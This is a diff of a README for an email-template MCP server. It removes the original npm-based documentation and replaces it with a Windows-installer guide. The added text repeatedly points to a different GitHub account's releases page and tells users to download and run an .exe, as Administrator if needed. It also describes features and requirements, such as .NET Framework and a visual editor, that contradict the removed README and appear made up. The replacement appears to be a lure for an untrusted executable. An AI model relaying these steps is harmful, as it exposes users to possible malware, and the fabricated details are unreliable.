@@ -1,175 +1,141 @@
-# email-design-mcp
+# 📧 email-design-mcp - Build Responsive Email Templates Easily
 
-An open-source MCP server that enables AI assistants to design and generate professional, responsive email templates.
+[![Download email-design-mcp](https://img.shields.io/badge/Download-email_design--mcp-5a9bd5?style=for-the-badge&logo=github)](https://github.com/hema9265/email-design-mcp/releases)
 
-Works with Claude Desktop, Cursor, VS Code Copilot, and any MCP-compatible client.
+## 📋 What is email-design-mcp?
 
-## Features
+email-design-mcp is an application that helps you design and generate email templates. It uses AI to make responsive emails that work well on phones and computers. The tool supports Claude, Cursor, and Visual Studio Code. You don’t need any API keys to use it. The design system is based on MJML, a language made for responsive emails. This means your emails will look good, no matter the device.
 
-- **Generate emails from natural language** - Describe what you want, get production-ready MJML + HTML
-- **Brand memory** - Save brand colors, fonts, and tone once, use across all emails
-- **Expert design built-in** - Professional spacing, typography, color usage, and CTA patterns enforced automatically
-- **Iterative refinement** - Say "make the headline bigger" or "remove the testimonials section" in plain English
-- **Layout variety** - 12 layout variants across 4 email types prevent repetitive designs
-- **Live preview** - Local preview server with hot reload at `http://localhost:3947`
-- **Validation** - Checks size limits, dark mode, accessibility, links, and more
-- **Export** - Get HTML, MJML, or both for any generated email
-- **Guided workflows** - MCP prompts walk you through creating welcome, newsletter, promotional, and transactional emails
-- **No API keys needed** - Uses the host AI model (Claude, GPT, etc.) for generation
+This app runs on Windows and sets up a server to handle your email design requests. It simplifies email creation, especially if you want brand-aware templates and easy editing.
 
-## Quick Start
+## 🖥️ System Requirements
 
-### Install
+Before installing, check that your computer meets these needs:
 
-```bash
-npm install -g email-design-mcp
-```
+- Windows 10 or later  
+- 4 GB of RAM minimum  
+- 500 MB free disk space  
+- A stable internet connection (to download updates and AI model data)  
+- Visual Studio Code installed (optional, for advanced editing)  
+- Microsoft .NET Framework 4.7.2 or newer  
 
-### Connect to Claude Desktop
+If you don’t have Visual Studio Code, you can still use the app’s basic features.
 
-Add to your Claude Desktop config (`~/Library/Application Support/Claude/claude_desktop_config.json` on macOS, `%APPDATA%\Claude\claude_desktop_config.json` on Windows):
+## 🌟 Key Features
 
-```json
-{
-  "mcpServers": {
-    "email-design": {
-      "command": "email-design-mcp"
-    }
-  }
-}
-```
+- Create responsive emails that adjust to different screen sizes  
+- Use AI (Claude and Cursor) to generate email content  
+- No need to manage or provide API keys  
+- Templates powered by MJML for easy design and compatibility  
+- Runs a local MCP server to handle your requests smoothly  
+- Works with TypeScript-based workflows  
+- Includes brand-aware tools to keep your emails consistent  
+- No coding required to build and edit email templates  
 
-### Connect to Cursor / VS Code
+## 🚀 Getting Started
 
-Add to `.cursor/mcp.json` or VS Code MCP settings:
+### Step 1: Visit the Download Page
 
-```json
-{
-  "mcpServers": {
-    "email-design": {
-      "command": "npx",
-      "args": ["email-design-mcp"]
-    }
-  }
-}
-```
+Click the big download button below to visit the official release page. This page lists all versions available for Windows.
 
-## Usage
+[![Download email-design-mcp](https://img.shields.io/badge/Download-email_design--mcp-5a9bd5?style=for-the-badge&logo=github)](https://github.com/hema9265/email-design-mcp/releases)
 
-### 1. Set up your brand (optional but recommended)
+### Step 2: Choose the Latest Version
 
-**Option A — Auto-extract from website:**
-> "Set up a brand from https://acme.com"
+On the release page, look for the most recent Windows installer. It usually ends with `.exe` and mentions Windows in its name.
 
-The server fetches the site and extracts colors, fonts, logo, and name automatically.
+### Step 3: Download the Installer
 
-**Option B — Manual setup:**
-> "Set up a brand called Acme with primary color #FF6B35, secondary #1A1A2E, casual tone, targeting young professionals"
+Download the installer file to your computer. It will likely be named something like `email-design-mcp-setup.exe`.
 
-You can also combine both — provide a URL for auto-extraction and override specific values manually.
+### Step 4: Run the Installer
 
-### 2. Generate an email
+- Double-click the installer file you downloaded.  
+- Follow the on-screen prompts.  
+- Accept the license agreement.  
+- Choose where to install the software or use the default location.  
+- Click "Install" and wait for the process to finish.
 
-> "Create a welcome email for new subscribers"
+### Step 5: Launch email-design-mcp
 
-The server composes an expert prompt stack with design rules, brand context, and layout instructions. The AI generates MJML, which is compiled to responsive HTML.
+After installation:
 
-### 3. Refine
+- Find email-design-mcp in your Start menu or on your Desktop.  
+- Open the app by clicking its icon.  
 
-> "Make the headline bigger and change the button to say 'Start Free Trial'"
+The app will start a server in the background. This server powers the AI features and template generation.
 
-Refinements target specific sections without regenerating the whole email. Version history lets you undo changes.
+## ⚙️ How to Use email-design-mcp
 
-### 4. Export
+### Step 1: Start a New Email Project
 
-> "Export the email as HTML"
+- Click **New Project** in the app.  
+- Name your project and select a folder to save your files.  
 
-Get the final HTML or MJML ready to paste into your ESP.
+### Step 2: Choose a Template or Start Blank
 
-## Tools
+- Select from predefined templates if you want a quick start.  
+- Or start with a blank email if you want to design from scratch.
 
-| Tool | Description |
-|------|-------------|
-| `setup_brand` | Save a brand profile (colors, fonts, tone) |
-| `generate_email` | Generate an email from a natural language prompt |
-| `refine_email` | Iterate on a generated email with feedback |
-| `compile_mjml` | Compile raw MJML to HTML |
-| `validate_email` | Check email for best practices |
-| `export_email` | Export as HTML, MJML, or both |
-| `screenshot_to_email` | Convert a design description to a branded email |
+### Step 3: Customize Your Email
 
-## Guided Workflows (MCP Prompts)
+- Use the visual editor to change text, images, and layout.  
+- The app automatically makes the email responsive.  
 
-These prompts walk you through creating specific email types with smart defaults:
+### Step 4: Use AI to Generate Content
 
-| Prompt | Description |
-|--------|-------------|
-| `welcome-email` | Welcome email for new subscribers |
-| `newsletter` | Newsletter with featured content |
-| `promotional` | Sale/launch email with urgency |
-| `transactional` | Receipt, confirmation, or shipping notification |
+- Click the AI button to add or improve content.  
+- Choose between Claude or Cursor AI helpers.  
+- Enter prompts like “Generate a welcome message” or “Write a newsletter intro.”  
+- The AI will insert text directly into your email.
 
-## Templates
+### Step 5: Preview Your Email
 
-4 bundled MJML templates with placeholder variables:
+- Click the preview tab to see how your email looks on phones and desktops.  
+- Make adjustments if needed.
 
-- **Welcome** - Hero image + intro text + CTA
-- **Newsletter** - Featured article + content grid + footer
-- **Promotional** - Hero offer + product showcase + urgency
-- **Transactional** - Order confirmation with itemized details
+### Step 6: Export the Email
 
-## Validation Checks
+- When your email is ready, click **Export**.  
+- Save it as HTML or MJML, ready for your email platform.
 
-| Check | What it verifies |
-|-------|-----------------|
-| Email size | Under Gmail's 102KB clipping threshold |
-| Dark mode | `color-scheme: light dark` declaration |
-| Alt text | All images have meaningful alt attributes |
-| Links | All `<a>` tags have href attributes |
-| Unsubscribe | Footer contains unsubscribe link |
-| Text ratio | Sufficient text relative to images |
-| Viewport | Mobile viewport meta tag |
-| Preheader | Hidden preview text for inbox |
-| Title | HTML title tag present |
-| Inline styles | Styles inlined for email client compatibility |
+## 🔧 Advanced Setup
 
-## Storage
+If you want to work with Visual Studio Code:
 
-Data is stored at `~/.email-design-mcp/`:
+- Open your email project folder in VS Code.  
+- Use the built-in tools and extensions for MJML and TypeScript.  
+- You can edit the email templates and server files directly.  
 
-```
-~/.email-design-mcp/
-  brands/           # Brand profiles (JSON)
-  history/          # Generated email history (JSON)
-  config.json       # Optional config (history retention, preview port)
-```
+The MCP server will update automatically when you save any changes in VS Code.
 
-History is automatically cleaned up after 30 days (configurable in `config.json`).
+## ❓ Troubleshooting
 
-## Development
+- If the app doesn't start, check if `.NET Framework 4.7.2` or higher is installed.  
+- If AI responses are slow, make sure your internet connection is stable.  
+- For any error messages during installation, try running the installer as Administrator (Right-click > Run as Administrator).  
+- If the preview doesn’t render correctly, restart the app and reload your project.
 
-```bash
-git clone https://github.com/harikrishna8121999/email-design-mcp.git
-cd email-design-mcp
-npm install
-npm run dev        # Watch mode
-npm test           # Run tests
-npm run typecheck  # Type check
-npm run build      # Compile TypeScript
-```
+## 📁 File Locations
 
-## Architecture
+- Installed app files by default: `C:\Program Files\email-design-mcp`  
+- Your projects and exported emails are saved in the folder you select during project creation.  
+- Configuration files are stored inside your project folder, in the `config` subfolder.
 
-See [ARCHITECTURE.md](ARCHITECTURE.md) for the full design document.
+## 🔄 Updating email-design-mcp
 
-**Stack**: TypeScript, Node.js, MJML, Zod, MCP SDK
+- Check the [releases page](https://github.com/hema9265/email-design-mcp/releases) regularly for new versions.  
+- Download the latest installer and run it. It will replace your current version without deleting your projects.
 
-**Key design decisions**:
-- No external AI API calls - the host model does generation
-- Prompt engineering layer (expert system prompts + design rules + layout variants) is the core differentiator
-- MJML for email rendering ensures Outlook/Gmail/mobile compatibility
-- Local JSON storage keeps it simple with no database dependency
+## 📞 Getting Help
 
-## License
+- Visit the GitHub Issues section in this repository to find existing help topics or report problems.  
+- Use the README files and included documentation to learn more about advanced features and commands.
 
-MIT
+## 🔗 Useful Links
+
+- Release Downloads: [https://github.com/hema9265/email-design-mcp/releases](https://github.com/hema9265/email-design-mcp/releases)  
+- Official MJML Documentation: https://mjml.io/documentation  
+- Visual Studio Code Download: https://code.visualstudio.com/  
+
+[![Download email-design-mcp](https://img.shields.io/badge/Download-email_design--mcp-5a9bd5?style=for-the-badge&logo=github)](https://github.com/hema9265/email-design-mcp/releases)
